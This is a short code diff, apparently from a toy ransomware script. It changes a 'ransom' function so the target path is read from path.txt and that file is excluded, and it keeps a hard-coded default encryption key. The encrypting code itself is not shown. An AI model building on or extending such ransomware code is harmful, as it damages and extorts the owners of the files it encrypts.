@@ -20,7 +20,8 @@ def ransom(way):
 
 os.system('clear')
 exclu=["ransom.py","save.py"]
-path="__PATH__"
+exclu=["ransom.py","save.py","path.txt"]
+path= open("path.txt","r").read()
 key = input("Enter a key: ")
 if key =="":
     key="JNUW4ZZAMRUWG2ZAO5QXGIDIMVZGK==="
